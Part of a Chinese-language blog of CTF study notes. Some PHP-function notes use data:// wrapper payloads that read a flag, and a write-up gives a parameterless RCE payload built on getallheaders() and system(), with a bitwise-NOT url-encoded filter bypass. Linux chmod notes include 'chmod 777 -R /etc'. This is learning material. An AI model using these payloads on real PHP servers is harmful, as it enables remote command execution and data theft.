<p> <a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(%E2%80%98.%E2%80%99));">http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(‘.’));var_dump(scandir(‘.’));</a> </p>
<h5 id="chdir"><a href="#chdir" class="headerlink" title="chdir(../../../)"></a>chdir(../../../)</h5><p>继续</p>
<p><a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(scandir(%E2%80%98.%E2%80%99));">http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(‘../../../‘));var_dump(scandir(‘.’));</a> </p>
<p>如果出现flag，进行读取</p>
<p><a target="_blank" rel="noopener" href="http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(&#39;../../../&#39;));var_dump(scandir(%E2%80%98.%E2%80%99));var_dump(readfile(flag)">http://39.107.126.173:28537/?a=data:text/plain,var_dump(chdir(&#39;../../../&#39;));var_dump(scandir(‘.’));var_dump(readfile(flag)</a>);</p>
<h4 id="•chr"><a href="#•chr" class="headerlink" title="•chr()"></a>•chr()</h4><p>*该函数用于将ASCII码值转化为字符串</p>
<h4 id="•ord"><a href="#•ord" class="headerlink" title="•ord()"></a>•ord()</h4><p>*该函数用于将字符串转化为ASCII码值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str1&#x3D;chr(88); </span><br><span class="line">echo $str1;</span><br><span class="line">echo &quot;\t&quot;; </span><br><span class="line">$str2&#x3D;ord(&#39;S&#39;); </span><br><span class="line">echo $str2;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223000853829.png"></p>
<h4 id="•getcwd"><a href="#•getcwd" class="headerlink" title="•getcwd()"></a>•getcwd()</h4><p>*函数返回当前工作目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo getcwd()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223001214698.png"></p>
<h4 id="•localtime"><a href="#•localtime" class="headerlink" title="•localtime()"></a>•localtime()</h4><p>*以一个数值数组和一个关联数组的形式输出本地时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(localtime());</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">print_r(localtime(time(),true));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; 38</span><br><span class="line">    [1] &#x3D;&gt; 13</span><br><span class="line">    [2] &#x3D;&gt; 16</span><br><span class="line">    [3] &#x3D;&gt; 22</span><br><span class="line">    [4] &#x3D;&gt; 11</span><br><span class="line">    [5] &#x3D;&gt; 120</span><br><span class="line">    [6] &#x3D;&gt; 2</span><br><span class="line">    [7] &#x3D;&gt; 356</span><br><span class="line">    [8] &#x3D;&gt; 0</span><br><span class="line">)</span><br><span class="line">&lt;br&gt;&lt;br&gt;Array</span><br><span class="line">(</span><br><span class="line">    [tm_sec] &#x3D;&gt; 38</span><br><span class="line">    [tm_min] &#x3D;&gt; 13</span><br><span class="line">    [tm_hour] &#x3D;&gt; 16</span><br><span class="line">    [tm_mday] &#x3D;&gt; 22</span><br><span class="line">    [tm_mon] &#x3D;&gt; 11</span><br><span class="line">    [tm_year] &#x3D;&gt; 120</span><br><span class="line">    [tm_wday] &#x3D;&gt; 2</span><br><span class="line">    [tm_yday] &#x3D;&gt; 356</span><br><span class="line">    [tm_isdst] &#x3D;&gt; 0</span><br><span class="line">)</span><br><span class="line">[Finished in 0.2s]</span><br></pre></td></tr></table></figure>

<h4 id="•localeconv-1"><a href="#•localeconv-1" class="headerlink" title="•localeconv()"></a>•localeconv()</h4><p>*localeconv()函数返回一个包含本地数字及货币格式信息的数组</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223001634117.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">array(18) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_curr_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;currency_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;positive_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;negative_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;mon_grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">[Finished in 0.2s]</span><br></pre></td></tr></table></figure>

<h4 id="•dirname"><a href="#•dirname" class="headerlink" title="•dirname()"></a>•dirname()</h4><p>*返回路径中的目录部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo dirname(&quot;D:\phpStudy\PHPTutorial\WWW&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223141210413.png"></p>
<h4 id="•array-rand"><a href="#•array-rand" class="headerlink" title="•array_rand()"></a>•array_rand()</h4><p>*函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array,number)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>array</em></td>
<td>必需。规定数组。</td>
</tr>
<tr>
<td><em>number</em></td>
<td>可选。规定返回多少个随机的元素。</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(&quot;a&quot;&#x3D;&gt;&quot;red&quot;,&quot;b&quot;&#x3D;&gt;&quot;green&quot;,&quot;c&quot;&#x3D;&gt;&quot;blue&quot;,&quot;d&quot;&#x3D;&gt;&quot;yellow&quot;);</span><br><span class="line">print_r(array_rand($a,2));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223141648065.png"></p>
<h4 id="•hex2bin"><a href="#•hex2bin" class="headerlink" title="•hex2bin()"></a>•hex2bin()</h4><p>*把十六进制值转换为 ASCII 字符</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(string)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。要转换的十六进制值。</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(&quot;48656c6c6f20576f726c6421&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223141929932.png"></p>
<h4 id="•readfile"><a href="#•readfile" class="headerlink" title="•readfile()"></a>•readfile()</h4><p>*读取一个文件，并写入到输出缓冲</p>
<p>*语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>filename</td>
<td>必需。规定要读取的文件。</td>
</tr>
<tr>
<td>include_path</td>
<td>可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td>
</tr>
<tr>
<td>context</td>
<td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo readfile(&quot;3.php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223142353720.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/" data-id="ckj176h8500005gv30klo3lo6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记10" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" class="article-date">
  <time datetime="2020-12-17T16:00:00.000Z" itemprop="datePublished">2020-12-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/">实战</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Your-Guojingming"><a href="#Your-Guojingming" class="headerlink" title="Your Guojingming"></a>Your Guojingming</h3><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201218171524302.png"></p>
<p>#是一道无参数RCE ，因此code只能是函数形式</p>
<p>#利用<code>getallheaders()</code>来获取参数RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>

<p>#查看没有过滤掉的字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($a&#x3D; 0; $a&lt; 256; $a++) &#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;[A-Za-z0-9]|\&#39;|&quot;|&#96;|\ |,|\.|-|\+|&#x3D;|\&#x2F;|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|&#x2F;is&#39;, chr($a))) &#123;</span><br><span class="line">        echo (chr($a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201218171655226.png"></p>
<p>根据师兄提醒的[‘phpinfo’][false] 可以构建一个字符串 “phpinfo”</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201218173436424.png"></p>
<p>#因为字母都被过滤掉了，得使用取反绕过，用urlencode编码构造一个phpinfo();</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215135456955.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215143317291.png"></p>
<p>#所以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); 也需要进行编码</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215145933621.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215150021504.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215150046880.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())));</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201215151550554.png"></p>
<h3 id="CRETE-FUNCTION函数"><a href="#CRETE-FUNCTION函数" class="headerlink" title="CRETE_FUNCTION函数"></a>CRETE_FUNCTION函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args,string $code)</span><br><span class="line">string $args 声明的函数变量部分</span><br><span class="line">string $code 执行的方法代码部分</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function()这个函数的漏洞，他create之后会自动生成一个函数名为%00lambda_%d</span><br></pre></td></tr></table></figure>

<p><code>create_function()</code>会创建一个匿名函数（<code>lambda</code>样式）。此处创建了一个叫<code>lambda_1</code>的函数，在第一个<code>echo</code>中显示出名字，并在第二个<code>echo</code>语句中执行了此函数。</p>
<p>create_function()函数会在内部执行 eval()，我们发现是执行了后面的<code>return</code>语句，属于<code>create_function()</code>中的第二个参数<code>string $code</code>位置。</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201219165245667.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201217141023196.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201219165449901.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" data-id="ckiqyhpbo0000uov34e9tbmk3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记9" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/" class="article-date">
  <time datetime="2020-12-11T07:34:04.393Z" itemprop="datePublished">2020-12-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/">linux一些小知识</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="1-安装docker出错的一些笔记："><a href="#1-安装docker出错的一些笔记：" class="headerlink" title="1.安装docker出错的一些笔记："></a>1.安装docker出错的一些笔记：</h3><p>1.安装好centos 7 后，对yumj进行更新</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/efb8664c05220263345c1906b50abb7.png"></p>
<p>报错，提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There are no enabled repos</span><br></pre></td></tr></table></figure>

<p>2.然后使用语句查看repos</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum repolist all</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/0055eac519718b074dad9f8298d2c52.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/584b937be048ed4981e07ac7e35e30b.png"></p>
<p>发现repolist 为0；</p>
<p>、、、、、、、、、</p>
<p>尝试过换源，安装163源、阿里源都有报错无果…….</p>
<h3 id="2-分析centos-7-系统里面的文件"><a href="#2-分析centos-7-系统里面的文件" class="headerlink" title="2. 分析centos 7 系统里面的文件"></a>2. 分析centos 7 系统里面的文件</h3><p><strong>Linux根目录”/“下各个系统文件夹的含义和用途</strong></p>
<p>1、/boot 该目录默认下存放的是Linux的启动文件和内核。</p>
<p>2、/initrd 它的英文含义是boot loader initialized RAM disk,就是由boot  loader初始化的内存盘。在linux内核启动前，boot  loader会将存储介质(一般是硬盘)中的initrd文件加载到内存，内核启动时会在访问真正的根文件系统前先访问该内存中的initrd文件系统。</p>
<p>3、/bin 该目录中存放Linux的常用命令。</p>
<p>4、/sbin 该目录用来存放系统管理员使用的管理程序。</p>
<p>5、/var 该目录存放那些经常被修改的文件，包括各种日志、数据文件。</p>
<p>6、/etc 该目录存放系统管理时要用到的各种配置文件和子目录，例如网络配置文件、文件系统、X系统配置文件、设备配置信息、设置用户信息等。</p>
<p>7、/dev 该目录包含了Linux系统中使用的所有外部设备，它实际上是访问这些外部设备的端口，访问这些外部设备与访问一个文件或一个目录没有区别。</p>
<p>8、/mnt 临时将别的文件系统挂在该目录下。</p>
<p>9、/root 如果你是以超级用户的身份登录的，这个就是超级用户的主目录。</p>
<p>10、/home 如果建立一个名为“xx”的用户，那么在/home目录下就有一个对应的“/home/xx”路径，用来存放该用户的主目录。</p>
<p>11、/usr 用户的应用程序和文件几乎都存放在该目录下。</p>
<p>12、/lib 该目录用来存放系统动态链接共享库，几乎所有的应用程序都会用到该目录下的共享库。</p>
<p>13、/opt 第三方软件在安装时默认会找这个目录,所以你没有安装此类软件时它是空的,但如果你一旦把它删除了,以后在安装此类软件时就有可能碰到麻烦。</p>
<p>14、/tmp 用来存放不同程序执行时产生的临时文件，该目录会被系统自动清理干净。</p>
<p>15、/proc 可以在该目录下获取系统信息，这些信息是在内存中由系统自己产生的，该目录的内容不在硬盘上而在内存里。</p>
<p>16、/misc 可以让多用户堆积和临时转移自己的文件。</p>
<p>17、/lost＋found 该目录在大多数情况下都是空的。但当突然停电、或者非正常关机后，有些文件就临时存放在这里。</p>
<p>18、文件颜色的含义：蓝色为文件夹；绿色是可执行文件；浅蓝色是链接文件；红框文件是加了SUID位，任意限权；红色为压缩文件；褐色为设备文件。</p>
<p>1、bin： 包含常用的Linux用户命令，例如，ls、sort、date和chmod。</p>
<p>2、/boot： 包含可引导的Linux内核和引导装载（boot loader）配置文件（GRUB）。</p>
<p>3、/dev： 包含代表系统设备访问点的文件。这包括终端设备（tty*)、软盘（fd<em>）、硬盘（hd</em>）、RAM（ram<em>）和CD-ROM（cd</em>）（用户通常通过设备文件直接访问这些设备）。</p>
<p>4、/etc：包含管理配置文件。</p>
<p>5、/home： 包含分配给每个拥有登陆帐号用户的目录。</p>
<p>6、/media：提供挂载（mounting）和自动挂载设备的标准位置，如远程文件系统和可移动介质（目录名为cdrecorder、floppy等）。</p>
<p>7、/mnt： 在被标准的/media目录替代前，这是很多设备常用的挂载点。某些可引导的Linux系统仍旧使用该目录来挂载硬盘分区和远程文件系统。</p>
<p>8、/proc：包含有关系统资源的信息。</p>
<p>9、/root：表示根用户的主目录。</p>
<p>10、/sbin：包含管理命令和守护进程。</p>
<p>11、/sys：一个类似与/proc的文件系统，在Linux2.6内核中最新出现的，包含的文件用于获得硬件状态并反映内核看到的系统设备树。它使用了/proc中的很多帮助。</p>
<p>12、/tmp：包含应用程序使用的临时文件。</p>
<p>13、/usr：包含用户文档、游戏、图形文件（X11）、库（lib），以及各种其他用户和管理命令及文件</p>
<p>14、/var：包含不同应用程序使用的数据目录。特别要注意的是，这里放置作为FTP服务器（/var/ftp）成Web服务器（/var/www）共享文件。它还包含所有系统日志文件（/var/log）。</p>
<h3 id="3-chmod命令"><a href="#3-chmod命令" class="headerlink" title="3. chmod命令"></a>3. chmod命令</h3><p>当文件设有权限时，可以使用chmod命令来获得权限、</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 -R &#x2F;etc</span><br></pre></td></tr></table></figure>

<p>设置Filename下所有文件权限<br>chmod -R 777 fileName<br>指令名称 : chmod<br>使用权限 : 所有使用者<br>使用方式 : chmod [-cfvR] [–help] [–version] mode file…<br>说明 : Linux/Unix 的档案调用权限分为三级 : 档案拥有者、群组、其他。利用 chmod 可以藉以控制档案如何被他人所调用。<br>参数 :<br>mode : 权限设定字串，格式如下 : [ugoa…][[+-=][rwxX]…][,…]，其中<br>u 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。<br>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。<br>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。<br>-c : 若该档案权限确实已经更改，才显示其更改动作<br>-f : 若该档案权限无法被更改也不要显示错误讯息<br>-v : 显示权限变更的详细资料<br>-R : 对目前目录下的所有档案与子目录进行相同的权限变更(即以递回的方式逐个变更)<br>–help : 显示辅助说明<br>–version : 显示版本<br>范例 :将档案 file1.txt 设为所有人皆可读取 :<br>chmod ugo+r file1.txt<br>将档案 file1.txt 设为所有人皆可读取 :<br>chmod a+r file1.txt<br>将档案 file1.txt 与 file2.txt 设为该档案拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :<br>chmod ug+w,o-w file1.txt file2.txt<br>将 ex1.py 设定为只有该档案拥有者可以执行 :<br>chmod u+x ex1.py<br>将目前目录下的所有档案与子目录皆设为任何人可读取 :<br>chmod -R a+r *<br>此外chmod也可以用数字来表示权限如 chmod 777 file<br>语法为：chmod abc file<br>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。<br>r=4，w=2，x=1<br>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=7。<br>范例：<br>chmod a=rwx file<br>和<br>chmod 777 file<br>效果相同<br>chmod ug=rwx,o=x file<br>和<br>chmod 771 file<br>效果相同<br>若用chmod 4755 filename可使此程序具有root的权限.<br>指令名称 : chown<br>使用权限 : root</p>
<p>使用方式 : chmod [-cfhvR] [–help] [–version] user[] file…</p>
<p>说 明 : Linux/Unix 是多人多工作业系统，所有的档案皆有拥有者。利用 chown  可以将档案的拥有者加以改变。一般来说，这个指令只有是由  系统管理者(root)所使用，一般使用者没有权限可以改变别人的档案拥有者，也没有权限可以自己的档案拥有者改设为别人。只有系统管理者(root)才 有这样的权限。</p>
<p>把计 :</p>
<p>user : 新的档案拥有者的使用者 IDgroup : 新的档案拥有者的使用者群 体(group)-c :  若该档案拥有者确实已经更改，才显示其更改动作-f : 若该档案拥有者无法被更改也不要显示错误讯息-h : 只对于连结  (link)进行变更，而非该 link 真正指向的档案-v : 显示拥有者变更的详细资料-R : 对目前目录下的所有档案与子目录进行相同的拥有者 变更(即以递回的方式逐个变更)–help : 显示辅助说明–version : 显示版本</p>
<p>范例 :<br>将档案 file1.txt 的拥有者设为 users 群体的使用者 jessie :<br>chown jessie:users file1.txt</p>
<p>将目前目录下的所有档案与子目录的拥有者皆设为 users 群体的使用者 lamport :<br>chmod -R lamport:users *<br>-rw——- (600) – 只有属主有读写权限。<br>-rw-r–r– (644) – 只有属主有读写权限；而属组用户和其他用户只有读权限。<br>-rwx—— (700) – 只有属主有读、写、执行权限。<br>-rwxr-xr-x (755) – 属主有读、写、执行权限；而属组用户和其他用户只有读、执行权限。<br>-rwx–x–x (711) – 属主有读、写、执行权限；而属组用户和其他用户只有执行权限。<br>-rw-rw-rw- (666) – 所有用户都有文件读、写权限。这种做法不可取。<br>-rwxrwxrwx (777) – 所有用户都有读、写、执行权限。更不可取的做法。<br>以下是对目录的两个普通设定:</p>
<p>drwx—— (700) - 只有属主可在目录中读、写。</p>
<h3 id="4-drwxr-xr-x-755-所有用户可读该目录，但只有属主才能改变目录中的内容。"><a href="#4-drwxr-xr-x-755-所有用户可读该目录，但只有属主才能改变目录中的内容。" class="headerlink" title="4.drwxr-xr-x (755) - 所有用户可读该目录，但只有属主才能改变目录中的内容。"></a>4.drwxr-xr-x (755) - 所有用户可读该目录，但只有属主才能改变目录中的内容。</h3><p>运行 .sh 文件类型的文件：<br>用file命令测试一下看是什么类型的<br>file xxxx.sh<br>如果是Bourne-Again shell script 可以sh xxxx.sh 或者chmod +x xxxx.sh 再./xxx.sh<br>一般 .sh 的直接添加x(可执行属性) chmod +x xxx.sh 然后./xxx.sh就可以了</p>
<h3 id="5-chmod是一个改变用户拥有指定文件的权限的命令-r-只读-w-写-x执行-也可以用数字"><a href="#5-chmod是一个改变用户拥有指定文件的权限的命令-r-只读-w-写-x执行-也可以用数字" class="headerlink" title="5.chmod是一个改变用户拥有指定文件的权限的命令.r:只读,w:写,x执行.也可以用数字"></a>5.chmod是一个改变用户拥有指定文件的权限的命令.r:只读,w:写,x执行.也可以用数字</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/" data-id="ckiqyhpc00001uov35yl9278k" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/" class="article-date">
  <time datetime="2020-11-26T12:34:09.711Z" itemprop="datePublished">2020-11-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/">90道MISC部分</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="90道MISC部分wp"><a href="#90道MISC部分wp" class="headerlink" title="90道MISC部分wp"></a>90道MISC部分wp</h2><h4 id="bw-图片隐写-64"><a href="#bw-图片隐写-64" class="headerlink" title="bw-图片隐写-64"></a>bw-图片隐写-64</h4><p>1.首先将安装包解压，发现是一个gif,但打不开。猜想：是不是文件的格式出现了问题</p>
